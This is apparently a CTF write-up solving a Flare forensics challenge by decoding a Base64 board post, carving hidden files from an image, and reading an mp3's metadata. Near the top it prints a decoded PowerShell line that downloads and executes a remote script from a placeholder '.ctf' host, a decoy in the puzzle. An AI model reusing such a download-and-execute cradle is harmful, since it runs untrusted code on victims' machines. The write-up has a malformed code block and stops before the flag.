# üîç Week 3

|Category         |	Author                |
|-----------------|-----------------------|
|üîç Forensics          |Flare.io        |

## Challenge Prompt

Step forward, defenders of data and seekers of the unseen. Challenge #3 of the Flare CTF has now opened, and this trial is unlike the rest.

The first 30 adventurers to unstack the final layer will earn this week‚Äôs rare prize, an artifact forged for those who never stop digging.

Guidelines for All Layer-Walkers
 - A new challenge appears each week with its own arcane mechanics.
 - The quest is revealed first in the Flare Academy Discord, then on LinkedIn one hour later.
 - Recover the hidden flag to unlock your reward.
 - Your flag is also the discount code used at checkout. Format: flare{...}
 - To keep the realm balanced, each adventurer may claim only one shirt per weekly quest.

Begin Your Descent: [https://techno-plaza-2000.com/](https://techno-plaza-2000.com/)<br>
Claim the Prize: [https://merch.flare.io/](https://merch.flare.io/)

The layers await, champion.<br>
Unstack the mystery. Claim the prize.

## Problem Type
- Image Forensics


## Solve

To start off, I visited the site. Once there we are presented with a Tinyboard style message board. There are 5 categories:
- Random
- Technology
- CTF
- Images
- Paranormal

I started by browsing each of the boards. On the Technology board, I thought I found my first piece:
<img width="1632" height="475" alt="Screenshot 2025-12-09 at 10 19 15‚ÄØPM" src="https://github.com/user-attachments/assets/50ff76f5-5b43-4f40-be6c-fe4df4c3e6c0" />


`SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdABoAGkAcwBfAGkAcwBfAGEAXwBkAGkAcwB0AHIAYQBjAHQAaQBvAG4ALgBjAHQAZgAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA`

I took that Base64 string to [CyberChef](https://gchq.github.io/CyberChef/):
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://this_is_a_distraction.ctf/payload.ps1')
```
Well at least they were nice enough to say it was a distraction!

I continued searching the boards and on the Paranormal board and I found this - a message hidden in this image, let's find out what it is:
<img width="939" height="307" alt="Screenshot 2025-12-09 at 10 16 00‚ÄØPM" src="https://github.com/user-attachments/assets/1ce7a802-2332-4d8e-9922-913b45234d88" />


I downloaded the image and then submitted to [Aperi'Solve](https://www.aperisolve.com) which runs a bunch of image forensics tools against the picture:
<img width="1377" height="308" alt="Screenshot 2025-12-09 at 9 49 20‚ÄØPM" src="https://github.com/user-attachments/assets/3580c9c7-34bc-4909-baf2-f5361cf6c4b2" />


In doing so, Foremost found a hidden file, which I then downloaded. This gave me `Foremost.7z` which I extracted to have the `png` and a `zip` folder.<br>
In the zip folder was a mp3 file called `metadata.mp3`. I started off by listening to the track, but it was just "meows". Should have guessed that by the cover art:

<img width="263" height="267" alt="Screenshot 2025-12-09 at 10 27 48‚ÄØPM" src="https://github.com/user-attachments/assets/a4914b49-901a-44a4-a6df-07447662f296" />

I then ran `exiftool` against the mp3 and got this:
```bash
exiftool metadata.mp3 
ExifTool Version Number         : 13.36
File Name                       : metadata.mp3
Directory                       : .
File Size                       : 363 kB
File Modification Date/Time     : 2025:12:03 14:34:41-05:00
File Access Date/Time           : 2025:12:09 22:27:35-05:00
File Inode Change Date/Time     : 2025:12:09 21:47:17-05:00
File Permissions                : -rw-r--r--
File Type                       : MP3
File Type Extension             : mp3
MIME Type                       : audio/mpeg
MPEG Audio Version              : 1
Audio Layer                     : 3
Audio Bitrate                   : 64 kbps
Sample Rate                     : 44100
Channel Mode                    : Stereo
MS Stereo                       : Off
Intensity Stereo                : Off
Copyright Flag                  : False
Original Media                  : False
Emphasis                        : None
ID3 Size                        : 111096
Title                           : Nya
Artist                          : Cicada 1337
Album                           : Techno Plaza
Year                            : 2010
Track                           : 1337
Genre                           : Death Metal
Comment                         : 00101111 01010100 01100100 00110110 01010111 01000110 01101111 01000001 01000001 01000001 01010100 01101101 00110001 01110010 01010010 01000111 01000010 01001101 Nice so our `comment` field is just a binary string, so back to [CyberChef](https://gchq.github.io/CyberChef/). A quick `From Binary` recipe gave me:
```

This looks like Base64, but just using the `From Base64` recipe in CyberChef gave me garbage, so I suspected it might be some type of Base64 encoded file.<br>
I added the `Extract Files` recipe after the `From Base64` and we have a file - `extracted_at_0x0.xz`. So, I downloaded that file from CyberChef.
<img width="1378" height="674" alt="Screenshot 2025-12-09 at 10 00 36‚ÄØPM" src="https://github.com/user-attachments/assets/4a5ea4f2-835d-46c4-9580-8b5d77020e91" />

I extracted that which gave me a `Stage2` folder. Inside that folder was a file called `binary`.

I ran `cat` on the file and got the flag:
